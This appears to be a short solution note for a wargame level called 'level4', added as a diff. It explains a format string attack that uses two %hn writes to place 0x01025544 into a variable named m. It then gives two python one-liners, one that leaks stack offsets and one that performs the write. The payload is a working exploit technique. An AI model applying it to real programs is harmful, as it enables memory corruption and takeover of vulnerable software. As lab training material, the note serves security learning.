@@ -1,0 +1,7 @@
+instead of writing a integer (4 bytes), we will write 2 short (2 bytes) with %hn
+
+we want to write 0x01025544 so 0x0102 (258 in decimal) at 0x08049812 (address of m plus 2 in high order bytes) and 0x5544 (21828 decimal) at 0x08049810 (address of m in low order bytes)
+
+python -c 'print "\x10\x98\x04\x08\x12\x98\x04\x08" + "%12$p " "%13$p"' | ./level4
+
+python -c 'print "\x10\x98\x04\x08\x12\x98\x04\x08%250x%13$hn%21570x%12$hn"' | ./level4
